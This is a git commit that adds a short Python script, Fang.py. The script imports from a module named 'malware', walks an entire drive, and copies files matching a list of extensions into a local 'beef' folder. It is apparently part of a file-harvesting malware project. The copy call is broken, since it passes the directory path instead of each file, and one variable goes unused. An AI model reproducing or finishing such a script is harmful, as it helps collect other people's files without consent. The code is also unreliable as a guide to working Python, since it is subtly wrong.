6b7a572cb2c25b79ab30cee0c0f5db44d3c3fc2e
C4piti44 <97689075+C4piti44@users.noreply.github.com>
2022-01-21 18:53:33 +0200

    Add files via upload

---
+++ Fang.py
@@ -0,0 +1,15 @@
+import shutil
+from malware import*
+import os
+the_dir = r"E:\the meat"
+for dirpath , dirname , filenames in os.walk(r'D:\\'):
+        for file in filenames:
+            if file.endswith(tuple(ex_list)):
+                try:
+                    shutil.copyfile(dirpath , r'C:\Users\USER\Desktop\beef')
+                except FileNotFoundError :
+                    pass
+
+
+
+
